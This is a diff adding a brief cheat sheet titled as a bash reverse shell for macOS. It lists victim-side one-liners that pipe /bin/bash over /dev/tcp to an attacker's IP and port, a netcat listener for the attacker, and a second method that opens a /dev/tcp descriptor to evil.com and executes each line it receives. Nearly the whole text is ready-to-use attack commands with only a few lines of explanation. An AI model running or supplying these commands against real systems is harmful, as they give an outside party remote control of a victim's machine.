@@ -1,0 +1,32 @@
+ =================================
+ = bash reverse shell on Mac osx =
+ =================================
+
+
+
+#Victim
+
+exec /bin/bash 0</dev/tcp/ipaddress/portnumber 1>&0 2>&0
+
+exec /bin/bash 0</dev/tcp/192.168.1.9/1234 1>&0 2>&0
+
+
+#Attacker
+
+nc -kl 1234
+
+
+
+/*===========================================================================================*/
+
+In step one we start a listening service on our box. We can use netcat.
+
+$ nc -l -p 8080 -vvv
+
+We will create a new descriptor which is assigned to a network node.
+Then we will read and write to that descriptor.
+
+$ exec 5<>/dev/tcp/evil.com/8080
+$ cat <&5 | while read line; do $line 2>&5 >&5; done
+
+/*===========================================================================================*/
